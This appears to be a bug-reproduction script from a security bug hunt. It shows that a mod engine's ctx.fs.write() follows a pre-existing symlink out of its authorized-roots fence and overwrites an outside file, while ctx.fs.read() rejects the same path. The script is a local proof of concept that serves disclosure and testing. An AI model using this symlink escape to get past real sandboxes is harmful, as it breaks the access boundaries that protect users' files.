// tc-001 repro: ctx.fs.write() escapes the authorized-roots fence via a
// pre-existing symlink; ctx.fs.read() correctly rejects the same path.
import { mkdir, symlink, readFile, rm, writeFile } from 'node:fs/promises'
import {
  createModContext,
  setModFsAuthOverrideForTesting,
} from '/Users/ethan/code/opencc/src/mods/engine.ts'

const base = '/tmp/bughunt-trae-code/fsrepro'
await rm(base, { recursive: true, force: true })
const inside = `${base}/inside`
const outside = `${base}/outside`
await mkdir(inside, { recursive: true })
await mkdir(outside, { recursive: true })
// "secret" file OUTSIDE every authorized root
await writeFile(`${outside}/secret.txt`, 'original')
// symlink INSIDE the authorized root pointing at it
await symlink(`${outside}/secret.txt`, `${inside}/link.txt`)

setModFsAuthOverrideForTesting(() => true)
const mod = {
  manifest: { name: 't', entry: 'x' },
  root: inside,
  entryPath: `${inside}/index.js`,
  handlers: [],
  commands: [],
  tools: [],
} as any
const ctx = createModContext(mod)
if (!ctx.fs) {
  console.log('SETUP FAILURE: no fs api')
  process.exit(1)
}

// 1. read through the symlink → fence must reject (it does)
let readResult: string
try {
  readResult = `allowed: ${await ctx.fs.read(`${inside}/link.txt`)}`
} catch (e: any) {
  readResult = `rejected: ${e.message}`
}

// 2. write through the same symlink (absolute path, as a real mod would)
let writeResult: string
try {
  await ctx.fs.write(`${inside}/link.txt`, 'PWNED-BY-MOD')
  writeResult = 'write() returned without error'
} catch (e: any) {
  writeResult = `rejected: ${e.message}`
}

const escaped = await readFile(`${outside}/secret.txt`, 'utf8')
console.log('read  via symlink :', readResult)
console.log('write via symlink :', writeResult)
console.log('outside file now  :', JSON.stringify(escaped))
console.log(
  escaped === 'PWNED-BY-MOD'
    ? 'REPRODUCED: write escaped the fence'
    : 'NOT REPRODUCED',
)
